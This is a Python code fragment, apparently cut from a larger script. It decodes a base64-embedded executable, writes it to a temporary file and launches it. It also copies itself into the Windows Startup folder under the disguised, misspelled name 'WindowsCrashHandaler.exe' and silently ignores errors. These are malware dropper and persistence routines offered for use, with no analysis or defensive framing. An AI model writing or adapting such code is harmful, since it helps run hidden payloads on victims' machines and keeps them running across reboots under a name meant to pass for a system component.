# Replace the string below with your actual base64 encoded EXE content.
exe_base64 = ""

def run_embedded_exe():
    try:
        exe_content = base64.b64decode(exe_base64)
        with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as temp_exe:
            temp_exe.write(exe_content)
            temp_exe_path = temp_exe.name
        os.startfile(temp_exe_path)
    except Exception as e:
        print(f"Error running embedded EXE: {e}")

### Clone the file to startup as "WindowsCrashHandaler.exe" ###
def clone_to_startup():
    try:
        current_path = sys.argv[0]
        startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        target_path = os.path.join(startup_dir, "WindowsCrashHandaler.exe")
        if not os.path.exists(target_path):
            shutil.copy(current_path, target_path)
    except Exception as e:
        pass

